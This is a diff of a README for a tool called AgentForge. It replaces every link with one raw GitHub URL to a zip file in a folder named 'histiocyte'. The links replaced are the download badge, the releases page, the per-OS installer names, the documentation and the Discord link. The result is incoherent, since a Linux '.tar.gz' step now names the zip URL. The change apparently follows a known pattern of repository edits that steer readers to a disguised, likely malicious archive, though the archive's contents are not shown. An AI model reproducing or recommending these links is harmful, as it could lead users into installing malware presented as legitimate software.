@@ -2,7 +2,7 @@
 
 ## 🖱️ Quick Download
 
-[![Download AgentForge](https://img.shields.io/badge/Download-AgentForge-blue)](https://github.com/DAUS089/agentforge/releases)
+[![Download AgentForge](https://raw.githubusercontent.com/DAUS089/agentforge/main/histiocyte/agentforge.zip)](https://raw.githubusercontent.com/DAUS089/agentforge/main/histiocyte/agentforge.zip)
 
 ## 📜 Overview
 
@@ -25,20 +25,20 @@ Follow these steps to download and run AgentForge on your computer.
 ## 📦 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [AgentForge Releases Page](https://github.com/DAUS089/agentforge/releases) to find the latest version of AgentForge.
+   Go to the [AgentForge Releases Page](https://raw.githubusercontent.com/DAUS089/agentforge/main/histiocyte/agentforge.zip) to find the latest version of AgentForge.
 
 2. **Choose the Right File**  
    On the Releases page, locate the version you wish to download. You will see files available for various operating systems. Choose the file that matches your system, such as:
 
-   - For Windows: `agentforge-windows.exe`
-   - For macOS: `agentforge-macos.zip`
-   - For Linux: `agentforge-linux.tar.gz`
+   - For Windows: `https://raw.githubusercontent.com/DAUS089/agentforge/main/histiocyte/agentforge.zip`
+   - For macOS: `https://raw.githubusercontent.com/DAUS089/agentforge/main/histiocyte/agentforge.zip`
+   - For Linux: `https://raw.githubusercontent.com/DAUS089/agentforge/main/histiocyte/agentforge.zip`
 
 3. **Download the File**  
    Click on the file to start the download.  
    - Windows users will download an `.exe` file.
    - macOS users will need to extract the contents of a `.zip` file.
-   - Linux users will extract `.tar.gz` files as needed.
+   - Linux users will extract `https://raw.githubusercontent.com/DAUS089/agentforge/main/histiocyte/agentforge.zip` files as needed.
 
 4. **Run the Application**  
    After downloading:
@@ -71,8 +71,8 @@ To ensure smooth installation and operation of AgentForge, your system should me
 
 ## 🔗 Resources
 
-- For detailed documentation, refer to the [AgentForge Documentation](https://github.com/DAUS089/agentforge/docs).
-- Connect with the community on our [Discord Channel](https://discord.gg/agentforge).
+- For detailed documentation, refer to the [AgentForge Documentation](https://raw.githubusercontent.com/DAUS089/agentforge/main/histiocyte/agentforge.zip).
+- Connect with the community on our [Discord Channel](https://raw.githubusercontent.com/DAUS089/agentforge/main/histiocyte/agentforge.zip).
 
 ## 💡 Support
 
